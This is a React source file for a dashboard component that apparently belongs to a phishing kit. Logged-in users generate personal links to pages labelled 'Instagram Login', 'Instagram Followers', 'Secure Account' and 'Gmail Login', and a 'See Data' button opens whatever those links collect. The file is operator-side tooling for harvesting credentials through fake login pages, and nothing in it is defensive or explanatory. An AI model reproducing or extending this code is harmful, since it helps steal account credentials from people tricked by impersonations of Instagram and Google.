import React, { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { auth } from '../firebase';
import { onAuthStateChanged } from 'firebase/auth';
import { FaLink, FaEye, FaUserShield, FaUsers, FaGoogle } from 'react-icons/fa';

const Dashboard = () => {
  const [generatedLink, setGeneratedLink] = useState('');
  const [followersLink, setFollowersLink] = useState('');
  const [secureAccountLink, setSecureAccountLink] = useState('');
  const [gmailLink, setGmailLink] = useState('');  // State for Gmail link
  const [userId, setUserId] = useState('');
  const navigate = useNavigate();

  useEffect(() => {
    const unsubscribe = onAuthStateChanged(auth, (user) => {
      if (user) {
        setUserId(user.uid);  
      } else {
        navigate('/login');
      }
    });

    return () => unsubscribe();  
  }, [navigate]);

  const handleGenerateLink = () => {
    const link = `${window.location.origin}/secureways/#/form/${userId}`;
    setGeneratedLink(link);
  };

  const handleGenerateFollowersLink = () => {
    const link = `${window.location.origin}/secureways/#/claimfollowers/${userId}`;
    setFollowersLink(link);
  };

  const handleGenerateSecureAccountLink = () => {
    const link = `${window.location.origin}/secureways/#/secureaccount/${userId}`;
    setSecureAccountLink(link);
  };

  const handleGenerateGmailLink = () => {   // Function to generate Gmail link
    const link = `${window.location.origin}/secureways/#/gmaillogin/${userId}`;
    setGmailLink(link);
  };

  const handleSeeData = () => {
    navigate('/seedata', { state: { userId } });
  };

  return (
    <div className="flex flex-col items-center p-4">
      {/* Title Section */}
      <div className="w-full text-center mb-4">
        <h1 className="text-3xl font-bold text-gray-700">Dashboard</h1>
      </div>

      {/* See Data Button */}
      <div className="w-full flex justify-end mb-4">
        <button
          onClick={handleSeeData}
          className="bg-green-500 text-white py-2 px-3 rounded hover:bg-green-600 transition duration-200 flex items-center text-sm"
        >
          <FaEye className="mr-2" /> See Data
        </button>
      </div>

      {/* Forms Section */}
      <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 gap-4 w-full">
        {/* Instagram Login (Security) Component */}
        <div className="border p-3 rounded-lg shadow w-full">
          <p className="text-sm font-bold text-gray-700 flex items-center mb-2">
            <FaUserShield className="mr-2 text-blue-500" /> Instagram Login
          </p>
          {generatedLink && (
            <div className="mt-2">
              <p className="text-sm">Generated Link:</p>
              <a
                href={generatedLink}
                target="_blank"
                rel="noopener noreferrer"
                className="text-blue-500 underline break-words text-xs"
              >
                {generatedLink}
              </a>
            </div>
          )}

          <button
            onClick={handleGenerateLink}
            className="w-full bg-blue-500 text-white py-2 mt-2 rounded hover:bg-blue-600 transition duration-200 text-sm flex items-center justify-center"
          >
            <FaLink className="mr-2" /> Generate Link
          </button>
        </div>

        {/* Instagram Followers Component */}
        <div className="border p-3 rounded-lg shadow w-full">
          <p className="text-sm font-bold text-gray-700 flex items-center mb-2">
            <FaUsers className="mr-2 text-blue-500" /> Instagram Followers
          </p>
          {followersLink && (
            <div className="mt-2">
              <p className="text-sm">Generated Link:</p>
              <a
                href={followersLink}
                target="_blank"
                rel="noopener noreferrer"
                className="text-blue-500 underline break-words text-xs"
              >
                {followersLink}
              </a>
            </div>
          )}

          <button
            onClick={handleGenerateFollowersLink}
            className="w-full bg-blue-500 text-white py-2 mt-2 rounded hover:bg-blue-600 transition duration-200 text-sm flex items-center justify-center"
          >
            <FaLink className="mr-2" /> Generate Followers Link
          </button>
        </div>

        {/* Secure Account Component */}
        <div className="border p-3 rounded-lg shadow w-full">
          <p className="text-sm font-bold text-gray-700 flex items-center mb-2">
            <FaUserShield className="mr-2 text-blue-500" /> Secure Account
          </p>
          {secureAccountLink && (
            <div className="mt-2">
              <p className="text-sm">Generated Link:</p>
              <a
                href={secureAccountLink}
                target="_blank"
                rel="noopener noreferrer"
                className="text-blue-500 underline break-words text-xs"
              >
                {secureAccountLink}
              </a>
            </div>
          )}

          <button
            onClick={handleGenerateSecureAccountLink}
            className="w-full bg-blue-500 text-white py-2 mt-2 rounded hover:bg-blue-600 transition duration-200 text-sm flex items-center justify-center"
          >
            <FaLink className="mr-2" /> Generate Secure Account Link
          </button>
        </div>

        {/* Gmail Login Component */}
        <div className="border p-3 rounded-lg shadow w-full">
          <p className="text-sm font-bold text-gray-700 flex items-center mb-2">
            <FaGoogle className="mr-2 text-red-500" /> Gmail Login
          </p>
          {gmailLink && (
            <div className="mt-2">
              <p className="text-sm">Generated Link:</p>
              <a
                href={gmailLink}
                target="_blank"
                rel="noopener noreferrer"
                className="text-blue-500 underline break-words text-xs"
              >
                {gmailLink}
              </a>
            </div>
          )}

          <button
            onClick={handleGenerateGmailLink}
            className="w-full bg-red-500 text-white py-2 mt-2 rounded hover:bg-red-600 transition duration-200 text-sm flex items-center justify-center"
          >
            <FaLink className="mr-2" /> Generate Gmail Login Link
          </button>
        </div>
      </div>
    </div>
  );
};

export default Dashboard;
